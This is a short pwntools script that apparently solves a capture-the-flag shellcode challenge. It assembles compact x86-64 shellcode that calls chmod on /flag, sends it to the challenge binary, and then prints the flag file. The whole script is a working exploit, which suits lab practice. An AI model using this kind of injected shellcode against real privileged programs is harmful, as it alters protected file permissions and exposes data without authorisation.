#!/usr/bin/env python3
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = "debug"

target_binary = "/challenge/diverse-delivery"

# 20 bytes of pure unique perfection
payload_asm = """
.intel_syntax noprefix
    movabs rbx, 0x02010067616c662f
    push rbx
    push rsp
    pop rdi
    push 0x3f
    pop rsi
    mov al, 90
    syscall
"""

payload = asm(payload_asm)

unique_bytes = set(payload)

p = process(target_binary)
p.send(payload)
p.wait()

import os
os.system("cat /flag")
